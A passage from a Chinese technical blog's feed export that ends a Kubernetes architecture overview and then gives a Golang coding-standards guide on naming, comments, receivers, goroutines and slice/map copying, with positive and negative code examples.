title="7.kube-proxy"></a>7.kube-proxy</h3><p>该组件运行在Kubernetes集群中每个节点上，作为节点上的网络代理。它监控kube-apiserver的服务和端点资源变化，并通过iptables&#x2F;ipvs等配置负载均衡器，为一组Pod提供统一的TCP&#x2F;UDP流量转发和负载均衡功能。但是kube-proxy组件与其他负载均衡服务的区别在于kube-proxy代理只想Kubernetes服务及其后端Pod发出请求。</p><h3 id="8-Add-ons"><a href="#8-Add-ons" class="headerlink" title="8.Add-ons"></a>8.Add-ons</h3><p>除了核心组件，还有一些推荐的Add-ons：</p><ul><li>kube-dns负责为整个集群提供DNS服务</li><li>Ingress Controller为服务提供外网入口</li><li>Heapster提供资源监控</li><li>Dashboard提供GUI</li><li>Federation提供跨可用区的集群</li><li>Fluentd-elasticsearch提供集群日志采集、存储与查询</li></ul><h2 id="三、Kubernetes-Project-Layout-设计"><a href="#三、Kubernetes-Project-Layout-设计" class="headerlink" title="三、Kubernetes Project Layout 设计"></a>三、Kubernetes Project Layout 设计</h2><table><thead><tr><th>源码目录</th><th>说明</th></tr></thead><tbody><tr><td>cmd&#x2F;</td><td>可执行文件的入口代码，每个可执行文件都会对应一个main函数</td></tr><tr><td>pkg&#x2F;</td><td>主要实现，核心库代码，并且可被项目内部或外部直接引用，</td></tr><tr><td>vendor&#x2F;</td><td>项目依赖的库代码，一般为第三方库代码</td></tr><tr><td>api&#x2F;</td><td>OpenAPI&#x2F;Swagger的spce文件，包括JSON、Protocol的定义等</td></tr><tr><td>build&#x2F;</td><td>与构建相关的脚本</td></tr><tr><td>test&#x2F;</td><td>测试工具及测试数据</td></tr><tr><td>docs&#x2F;</td><td>设计或用户使用文档</td></tr><tr><td>hack&#x2F;</td><td>构建、测试等相关代码</td></tr><tr><td>third_party</td><td>第三方工具、代码或者其他组件</td></tr><tr><td>plugin&#x2F;</td><td>Kubernetes插件代码目录，例如认证、授权等相关插件</td></tr><tr><td>staging&#x2F;</td><td>部分核心库的暂存目录</td></tr><tr><td>translations&#x2F;</td><td>i18n（国际化）语言包的相关文件，可以在不修改内部代码的情况下支持不同语言及地区</td></tr></tbody></table><h2 id="四、源码分析"><a href="#四、源码分析" class="headerlink" title="四、源码分析"></a>四、源码分析</h2><p><a href="https://github.com/longpi1/Reading-notes/tree/main/kuberneters/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90">https://github.com/longpi1/Reading-notes/tree/main/kuberneters/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://raw.githubusercontent.com/kubernetes">https://raw.githubusercontent.com/kubernetes</a></p><p>2.<a href="https://juejin.cn/post/6999610929105240094">https://juejin.cn/post/6999610929105240094</a></p>]]></content>
    
    
    <categories>
      
      <category>Kubernetes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>Kubernetes</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang代码规范</title>
    <link href="/2023/03/23/Golang%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/"/>
    <url>/2023/03/23/Golang%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang代码规范"><a href="#Golang代码规范" class="headerlink" title="Golang代码规范"></a>Golang代码规范</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h2><p>本篇文章主要介绍代码编写时需要注意的基本规范，Golang代码安全相关规范可参考<a href="https://blog.longpi1.com/2022/12/31/Golang%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E8%A7%84%E8%8C%83/">Golang代码安全规范</a>，大家有其他相关思路，欢迎提出；</p><h2 id="2-编程规约"><a href="#2-编程规约" class="headerlink" title="2 编程规约"></a>2 编程规约</h2><h3 id="2-1-命名风格"><a href="#2-1-命名风格" class="headerlink" title="2.1 命名风格"></a>2.1 命名风格</h3><ul><li><p>【强制】代码中的命名均不能以<strong>特殊字符</strong>开始和结束，包含常见的中划线、下划线等。</p><p>反例:</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs golang">_name; -name; __name; --name; $name; %name<br></code></pre></td></tr></table></figure></li><li><p>【强制】参数名、局部变量都统一使用<strong>lowerCamelCase</strong>(<strong>小驼峰</strong>)风格。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">demo</span><span class="hljs-params">(ctx context.Context, name <span class="hljs-type">string</span>)</span></span> &#123;<br>    <span class="hljs-keyword">var</span> localVar <span class="hljs-type">string</span><br>    <span class="hljs-comment">// other operations</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【推荐】全局变量统一使用<strong>小驼峰</strong>风格。包外引用需要提供相应的导出函数对外导出使用。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">var</span> globalVar <span class="hljs-type">string</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Set</span><span class="hljs-params">(value <span class="hljs-type">string</span>)</span></span> &#123;<br>    globalVar = value<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】函数名和方法(method)的命名区分导出和非导出类型。对于包内非导出的函数或方法使用小驼峰风格。对于导出的函数或方法采用<strong>UpperCamelCase</strong>(<strong>大驼峰</strong>)风格。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">localFunction</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-keyword">type</span> sample <span class="hljs-keyword">struct</span> &#123;&#125;<br><br><span class="hljs-comment">// Show print hello</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *sample)</span></span> Show() &#123;<br>    fmt.Println(<span class="hljs-string">&quot;Hello Blueking.&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】struct的命名区分导出和非导出类型。对于包内非导出的struct使用<strong>小驼峰</strong>风格。对于导出的struct采用<strong>大驼峰</strong>风格。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> unexportedSample <span class="hljs-keyword">struct</span> &#123;&#125;<br><br><span class="hljs-comment">// ExportedSample exported sample</span><br><span class="hljs-keyword">type</span> ExportedSample <span class="hljs-keyword">struct</span> &#123;&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】常量命名使用大驼峰风格，不要使用下划线分隔，力求语义表达完整清楚，不要嫌名字长。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs golang">MaxConnectionCount<br></code></pre></td></tr></table></figure><p>反例</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs golang">MAX_CNNECTION_COUNT<br></code></pre></td></tr></table></figure></li><li><p>【推荐】接口(interface)采用<strong>大驼峰</strong>的风格命名。具体细分为以下三种情况：</p><ul><li><p>单个函数的接口名以“er”作为后缀，如Reader, Writer。而接口的实现则去掉“er”。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> Reader <span class="hljs-keyword">interface</span> &#123;<br>    Read(p []<span class="hljs-type">byte</span>) (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>两个函数的接口名缩合两个函数名</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> WriteFlusher <span class="hljs-keyword">interface</span> &#123;<br>    Write([]<span class="hljs-type">byte</span>) (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>)<br>    Flush() <span class="hljs-type">error</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>三个以上函数的接口名，类似于结构体名</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> Car <span class="hljs-keyword">interface</span> &#123;<br>    Start([]<span class="hljs-type">byte</span>)<br>    Stop() <span class="hljs-type">error</span><br>    Recover()<br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>【强制】包名统一采用小写风格，使用短命名，不能包含特殊字符（下划线、中划线等）语义表达准确。建议最好是一个单词。使用多级目录来划分层级。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> client<br><span class="hljs-keyword">package</span> clientset<br></code></pre></td></tr></table></figure><p>反例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> Demo<br><span class="hljs-keyword">package</span> Demo_Case<br></code></pre></td></tr></table></figure></li><li><p>【强制】杜绝不规范的缩写，避免望文不生意。不必要进行缩写时，避免进行缩写。<strong>对于专 用名词如URL&#x2F;CMDB&#x2F;GSE等，在使用时要保证全名统一为大写或小写。不能出现部分大写和小写混用的情况。</strong></p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">setURL</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetURL</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br></code></pre></td></tr></table></figure><p>反例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">var</span> sidecarUrl <span class="hljs-type">string</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ResetUrl</span><span class="hljs-params">()</span></span>  &#123;<br>    <span class="hljs-comment">// do something</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【推荐】如果包、struct、interface等使用了设计模式，在命名时需要体现出对应的设计模式。这有利于阅读者快速理解代码的设计架构和设计理念。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> ContainerFactory <span class="hljs-keyword">interface</span> &#123;<br>    Create(id <span class="hljs-type">string</span>, config *configs.Config) (Container, <span class="hljs-type">error</span>)<br>    Load(id <span class="hljs-type">string</span>) (Container, <span class="hljs-type">error</span>)<br>    StartInitialization() <span class="hljs-type">error</span><br>    Type() <span class="hljs-type">string</span><br>&#125;<br><span class="hljs-keyword">type</span> PersonDecorator <span class="hljs-keyword">interface</span> &#123;<br>    SetName(name <span class="hljs-type">string</span>) PersonDecorator<br>    SetAge(age <span class="hljs-type">uint</span>) PersonDecorator<br>    Show()<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-2-常量定义"><a href="#2-2-常量定义" class="headerlink" title="2.2 常量定义"></a>2.2 常量定义</h3><ul><li><p>【强制】对于多个具有枚举特性的类型，要求定义成为类型，并利用常量进行枚举。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> EventType <span class="hljs-type">string</span><br><span class="hljs-keyword">const</span> (<br>    Create EventType = <span class="hljs-string">&quot;create&quot;</span><br>    Update EventType = <span class="hljs-string">&quot;update&quot;</span><br>    Get    EventType = <span class="hljs-string">&quot;get&quot;</span><br>    Delete EventType = <span class="hljs-string">&quot;delete&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>【强制】<strong>不允许任何未经定义的常量直接在代码中使用。</strong></p></li></ul><h3 id="2-3-代码格式"><a href="#2-3-代码格式" class="headerlink" title="2.3 代码格式"></a>2.3 代码格式</h3><ul><li>【强制】采用4个空格的缩进，每个tab也代表4个空格。这是唯一能够保证在所有环境下获得一致展现的方法。</li><li>【强制】运算符(:&#x3D;, &#x3D;等)的左右两侧必须要加一个空格（符合gofmt逻辑）。</li><li>【强制】作为输入参数或者数组下标时，运算符和运算数之间不需要空格，紧凑展示（符合gofmt逻辑）。</li><li>【强制】提交的代码必须经过gofmt格式化。很多IDE支持自动gofmt格式化。</li><li>【推荐】代码最大行宽为120列，超过换行。</li></ul><h3 id="2-4-控制语句"><a href="#2-4-控制语句" class="headerlink" title="2.4 控制语句"></a>2.4 控制语句</h3><h4 id="2-4-1-if"><a href="#2-4-1-if" class="headerlink" title="2.4.1 if"></a>2.4.1 if</h4><ul><li><p>【强制】if接受一个初始化语句，<strong>对于返回参数不需要流入到下一个语句时，通过建立局部变量的方式构建if判断语句。</strong></p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">if</span> err := file.Chmod(<span class="hljs-number">0664</span>); err != <span class="hljs-literal">nil</span> &#123;<br>    <span class="hljs-keyword">return</span> err<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】对于遍历数据(如map)的场景，如果只使用第一项，则直接丢弃第二项。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">for</span> key := <span class="hljs-keyword">range</span> mapper &#123;<br>    codeUsing(key)<br>&#125;<br></code></pre></td></tr></table></figure><p>反例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">for</span> key, _ := <span class="hljs-keyword">range</span> mapper &#123;<br>    codeUsing(key)<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="2-5-注释规约"><a href="#2-5-注释规约" class="headerlink" title="2.5 注释规约"></a>2.5 注释规约</h3><ul><li><p>【强制】注释必须是完整的句子，以句点作为结尾。</p></li><li><p>【强制】使用行间注释时，如果注释行与上一行不属于同一代码层级，不用空行。如果属于同行，则空一行再进行注释。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">demo</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// This is a start line of a new block, do not need a new line </span><br>    <span class="hljs-comment">// with the previous code.</span><br>    say(<span class="hljs-string">&quot;knock, knock!&quot;</span>)<br>    <br>    <span class="hljs-comment">// This is the same block with the previous code,</span><br>    <span class="hljs-comment">// you should insert a new line before you start a comment.</span><br>    echo(<span class="hljs-string">&quot;who is there ?&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】使用 &#x2F;&#x2F; 进行注释时, 和注释语句之间必须有一个空格。增加可读性。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">// validator is used to validate dns&#x27;s format.</span><br><span class="hljs-comment">// should not contains dot, underscore character, etc.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">validator</span><span class="hljs-params">(dns <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>    <span class="hljs-comment">// do validate.</span><br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】<strong>不要使用尾注释</strong></p><p>反例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">show</span><span class="hljs-params">(name <span class="hljs-type">string</span>)</span></span> &#123;<br>    display(name) <span class="hljs-comment">// show a man&#x27;s information</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】使用&#x2F;**&#x2F;风格进行多行注释时，首&#x2F;<em>和尾</em>&#x2F;两行内容中不能包含注释内容，也不能包含额外的内容，如星号横幅等。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">/*</span><br><span class="hljs-comment">The syntax of the regular expressions accepted is:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    regexp:</span><br><span class="hljs-comment">        concatenation &#123; &#x27;|&#x27; concatenation &#125;</span><br><span class="hljs-comment">    concatenation:</span><br><span class="hljs-comment">        &#123; closure &#125;</span><br><span class="hljs-comment">    closure:</span><br><span class="hljs-comment">        term [ &#x27;*&#x27; | &#x27;+&#x27; | &#x27;?&#x27; ]</span><br><span class="hljs-comment">    term:</span><br><span class="hljs-comment">        &#x27;^&#x27;</span><br><span class="hljs-comment">        &#x27;$&#x27;</span><br><span class="hljs-comment">        &#x27;.&#x27;</span><br><span class="hljs-comment">        character</span><br><span class="hljs-comment">        &#x27;[&#x27; [ &#x27;^&#x27; ] character-ranges &#x27;]&#x27;</span><br><span class="hljs-comment">        &#x27;(&#x27; regexp &#x27;)&#x27;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure></li><li><p>【强制】注释的单行长度最大不能超过120列，超过必须换行。一般以80列换行为宜。</p></li><li><p>【推荐】函数与方法的注释需要以函数或方法的名称作为开头。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">// HasPrefix tests whether the string s begins with prefix.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HasPrefix</span><span class="hljs-params">(s, prefix <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(s) &gt;= <span class="hljs-built_in">len</span>(prefix) &amp;&amp; s[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(prefix)] == prefix<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【推荐】大段注释采用&#x2F;**&#x2F;风格进行注释。</p></li><li><p>【推荐】包中的每一个导出的函数、方法、结构体和常量都应该有相应的注释。</p></li><li><p>【推荐】对于特别复杂的包说明，可以单独创建doc.go文件来详细说明。</p></li></ul><h3 id="2-6-interface-的指针"><a href="#2-6-interface-的指针" class="headerlink" title="2.6 interface 的指针"></a>2.6 interface 的指针</h3><p>您几乎不需要指向接口类型的指针。您应该将接口作为值进行传递，在这样的传递过程中，实质上传递的底层数据仍然可以是指针。</p><p>接口实质上在底层用两个字段表示：</p><ol><li>一个指向某些特定类型信息的指针。您可以将其视为”type”。</li><li>数据指针。如果存储的数据是指针，则直接存储。如果存储的数据是一个值，则存储指向该值的指针。</li></ol><p>如果希望接口方法修改基础数据，则必须使用指针传递 (将对象指针赋值给接口变量)。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> F <span class="hljs-keyword">interface</span> &#123;<br>  f()<br>&#125;<br><br><span class="hljs-keyword">type</span> S1 <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s S1)</span></span> f() &#123;&#125;<br><br><span class="hljs-keyword">type</span> S2 <span class="hljs-keyword">struct</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *S2)</span></span> f() &#123;&#125;<br><br><span class="hljs-comment">// f1.f() 无法修改底层数据</span><br><span class="hljs-comment">// f2.f() 可以修改底层数据，给接口变量 f2 赋值时使用的是对象指针</span><br><span class="hljs-keyword">var</span> f1 F = S1&#123;&#125;<br><span class="hljs-keyword">var</span> f2 F = &amp;S2&#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="2-7-其它"><a href="#2-7-其它" class="headerlink" title="2.7 其它"></a>2.7 其它</h3><h4 id="2-7-1-参数传递"><a href="#2-7-1-参数传递" class="headerlink" title="2.7.1 参数传递"></a>2.7.1 参数传递</h4><ul><li>【推荐】对于少量数据，不要通过指针传递。</li><li>【推荐】对于大量(&gt;&#x3D;4)的入参，考虑使用struct进行封装，并通过指针传递。</li><li>【强制】传参是map, slice, chan 不要使用指针进行传递。因为这三者是引用类型。</li></ul><h4 id="2-7-2-接受者（receiver）"><a href="#2-7-2-接受者（receiver）" class="headerlink" title="2.7.2 接受者（receiver）"></a>2.7.2 接受者（receiver）</h4><ul><li><p>【推荐】名称统一采用1~3个字母，不宜太长。</p></li><li><p>【推荐】对于绝在多数可以使用指针接受者的场景，推荐使用指针接受者(point receiver)会更有效率。</p></li><li><p>【强制】如果接受者是map, slice, chan，不能使用指针接受者。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> queue <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q queue)</span></span> Push(i <span class="hljs-keyword">interface</span>&#123;&#125;) &#123;<br>    q &lt;- i<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(q queue)</span></span> Pop() <span class="hljs-keyword">interface</span>&#123;&#125; &#123;<br>    <span class="hljs-keyword">return</span> &lt;-q<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    c := <span class="hljs-built_in">make</span>(queue, <span class="hljs-number">1</span>)<br>    c.Push(<span class="hljs-string">&quot;i&quot;</span>)<br>    fmt.Println(c.Pop())<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>【强制】如果接受者是包含有锁(sync.Mutex等)，必须使用指针接受者。</p></li></ul><h4 id="2-7-3-启动任何一个goroutine都要先想好如何退出"><a href="#2-7-3-启动任何一个goroutine都要先想好如何退出" class="headerlink" title="2.7.3 启动任何一个goroutine都要先想好如何退出"></a>2.7.3 启动任何一个goroutine都要先想好如何退出</h4><h4 id="2-7-4-return-err的时候清理本无需启动的goroutine"><a href="#2-7-4-return-err的时候清理本无需启动的goroutine" class="headerlink" title="2.7.4 return err的时候清理本无需启动的goroutine"></a>2.7.4 return err的时候清理本无需启动的goroutine</h4><h4 id="2-7-5-想好如何合理优雅Stop"><a href="#2-7-5-想好如何合理优雅Stop" class="headerlink" title="2.7.5 想好如何合理优雅Stop"></a>2.7.5 想好如何合理优雅Stop</h4><h4 id="2-7-6-使用done-chan退出goroutine的时候，不要做任何清理资源的操作。清理资源优先使用defer，因为当goroutine-panic的时候，-defer还能够清理资源，而done-chan中的清理逻辑可能永远不会被执行"><a href="#2-7-6-使用done-chan退出goroutine的时候，不要做任何清理资源的操作。清理资源优先使用defer，因为当goroutine-panic的时候，-defer还能够清理资源，而done-chan中的清理逻辑可能永远不会被执行" class="headerlink" title="2.7.6 使用done chan退出goroutine的时候，不要做任何清理资源的操作。清理资源优先使用defer，因为当goroutine panic的时候， defer还能够清理资源，而done chan中的清理逻辑可能永远不会被执行"></a>2.7.6 使用done chan退出goroutine的时候，不要做任何清理资源的操作。清理资源优先使用defer，因为当goroutine panic的时候， defer还能够清理资源，而done chan中的清理逻辑可能永远不会被执行</h4><h4 id="2-7-7-不建议使用time-after-。使用time-NewTicker-代替，并及时清理ticker"><a href="#2-7-7-不建议使用time-after-。使用time-NewTicker-代替，并及时清理ticker" class="headerlink" title="2.7.7 不建议使用time.after()。使用time.NewTicker()代替，并及时清理ticker"></a>2.7.7 不建议使用<code>time.after()</code>。使用<code>time.NewTicker()</code>代替，并及时清理ticker</h4><h4 id="2-7-8-关闭-Stop-插件的时候注意关闭的顺序和资源释放，-不要造成其他goroutine夯住-例如供外部写的0容量的chan没有处理，但是读的goroutine退出了，导致外部写的goroutine一直阻塞"><a href="#2-7-8-关闭-Stop-插件的时候注意关闭的顺序和资源释放，-不要造成其他goroutine夯住-例如供外部写的0容量的chan没有处理，但是读的goroutine退出了，导致外部写的goroutine一直阻塞" class="headerlink" title="2.7.8 关闭(Stop)插件的时候注意关闭的顺序和资源释放， 不要造成其他goroutine夯住(例如供外部写的0容量的chan没有处理，但是读的goroutine退出了，导致外部写的goroutine一直阻塞)"></a>2.7.8 关闭(Stop)插件的时候注意关闭的顺序和资源释放， 不要造成其他goroutine夯住(例如供外部写的0容量的chan没有处理，但是读的goroutine退出了，导致外部写的goroutine一直阻塞)</h4><h3 id="2-8-在边界处拷贝-Slices-和-Maps"><a href="#2-8-在边界处拷贝-Slices-和-Maps" class="headerlink" title="2.8 在边界处拷贝 Slices 和 Maps"></a>2.8 在边界处拷贝 Slices 和 Maps</h3><p>slices 和 maps 包含了指向底层数据的指针，因此在需要复制它们时要特别注意。</p><h4 id="2-8-1-接收-Slices-和-Maps"><a href="#2-8-1-接收-Slices-和-Maps" class="headerlink" title="2.8.1 接收 Slices 和 Maps"></a>2.8.1 接收 Slices 和 Maps</h4><p>请记住，当 map 或 slice 作为函数参数传入时，如果您存储了对它们的引用，则用户可以对其进行修改。</p><p>正例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d *Driver)</span></span> SetTrips(trips []Trip) &#123;<br>  d.trips = <span class="hljs-built_in">make</span>([]Trip, <span class="hljs-built_in">len</span>(trips))<br>  <span class="hljs-built_in">copy</span>(d.trips, trips)<br>&#125;<br><br>trips := ...<br>d1.SetTrips(trips)<br><br><span 